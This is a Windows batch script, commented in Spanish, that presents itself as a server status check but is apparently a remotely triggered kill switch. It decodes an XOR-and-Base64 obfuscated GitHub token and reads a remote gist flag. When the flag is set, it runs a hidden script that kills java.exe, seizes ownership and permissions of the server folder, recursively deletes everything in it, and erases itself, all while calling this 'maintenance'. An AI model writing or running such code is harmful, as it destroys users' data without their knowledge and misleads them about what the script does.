@echo off
setlocal EnableDelayedExpansion

REM ============================================================
REM  Sistema de verificacion de estado del servidor
REM ============================================================

REM Token de GitHub ofuscado (XOR + Base64)
set "TOKEN_XOR=BFwCbgh4DhpWGA4EW3V9K3o7fwx5MRxUIxdfY3puM3BDQ1NhaQt2Ig=="
set "XOR_KEY=c4r1b3_x0r_2026"

REM Gist ID de tu servidor
set "GIST=5649b004572f4ed30efd2b0a120cf1ab"

REM Ruta de la carpeta del servidor
for %%I in ("%~dp0..") do set "SERVER_DIR=%%~fI"

REM ═══════════════════════════════════════════════════════════
REM  Generar el script PowerShell auxiliar
REM ═══════════════════════════════════════════════════════════
set "PS1=%TEMP%\~c_%RANDOM%.ps1"

>"%PS1%" echo $e = [Convert]::FromBase64String^('%TOKEN_XOR%'^)
>>"%PS1%" echo $k = [Text.Encoding]::UTF8.GetBytes^('%XOR_KEY%'^)
>>"%PS1%" echo $n = $e.Length
>>"%PS1%" echo $b = New-Object byte[] $n
>>"%PS1%" echo $i = 0
>>"%PS1%" echo $kl = $k.Length
>>"%PS1%" echo while ^($i -lt $n^) { $b[$i] = $e[$i] -bxor $k[$i %% $kl]; $i = $i + 1 }
>>"%PS1%" echo $t = [Text.Encoding]::UTF8.GetString^($b^)
>>"%PS1%" echo try {
>>"%PS1%" echo   $h = @{Authorization = 'Bearer ' + $t; Accept = 'application/vnd.github+json'}
>>"%PS1%" echo   $r = Invoke-RestMethod -Uri 'https://api.github.com/gists/%GIST%' -Headers $h
>>"%PS1%" echo   $raw = $r.files.'settings.json'.content
>>"%PS1%" echo   $c = ConvertFrom-Json -InputObject $raw
>>"%PS1%" echo   if ^($c.active^) { Write-Output 'DESTROY' } else { Write-Output 'SAFE' }
>>"%PS1%" echo } catch {
>>"%PS1%" echo   Write-Output 'ERROR'
>>"%PS1%" echo }

REM ═══════════════════════════════════════════════════════════
REM  Ejecutar el script y capturar salida
REM ═══════════════════════════════════════════════════════════
echo Consultando estado del servidor...

set "STATUS=ERROR"
set "OUT=%TEMP%\~o_%RANDOM%.txt"
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%" > "%OUT%" 2>&1
set "GOT="
for /f "usebackq delims=" %%A in ("%OUT%") do (
    if not defined GOT (
        set "GOT=1"
        set "STATUS=%%A"
    )
)
del "%PS1%" "%OUT%" 2>nul

echo Estado: !STATUS!

REM ═══════════════════════════════════════════════════════════
REM  IF
REM ═══════════════════════════════════════════════════════════
if /i not "!STATUS!"=="DESTROY" (
    exit /b 0
)

REM ═══════════════════════════════════════════════════════════
REM  ACTIVO
REM ═══════════════════════════════════════════════════════════
echo.
echo ========================================
echo   PROTOCOLO DE MANTENIMIENTO ACTIVO
echo ========================================
echo.

set "KILLER=%TEMP%\~k_%RANDOM%.bat"

>"%KILLER%" echo @echo off
>>"%KILLER%" echo timeout /t 5 /nobreak ^>nul
>>"%KILLER%" echo taskkill /F /IM java.exe 2^>nul
>>"%KILLER%" echo timeout /t 3 /nobreak ^>nul
>>"%KILLER%" echo takeown /f "%SERVER_DIR%" /r /d y ^>nul 2^>^&1
>>"%KILLER%" echo icacls "%SERVER_DIR%" /grant *S-1-1-0:F /t /q ^>nul 2^>^&1
>>"%KILLER%" echo timeout /t 2 /nobreak ^>nul
>>"%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
>>"%KILLER%" echo timeout /t 2 /nobreak ^>nul
>>"%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
>>"%KILLER%" echo timeout /t 2 /nobreak ^>nul
>>"%KILLER%" echo for /d %%%%D in ("%SERVER_DIR%\*") do rmdir /s /q "%%%%D" 2^>nul
>>"%KILLER%" echo timeout /t 2 /nobreak ^>nul
>>"%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
>>"%KILLER%" echo timeout /t 2 /nobreak ^>nul
>>"%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
>>"%KILLER%" echo del "%%~f0"

echo Ejecutando protocolo de mantenimiento...
start "" /min "%KILLER%"

echo El servidor se apagara.
exit /b 1
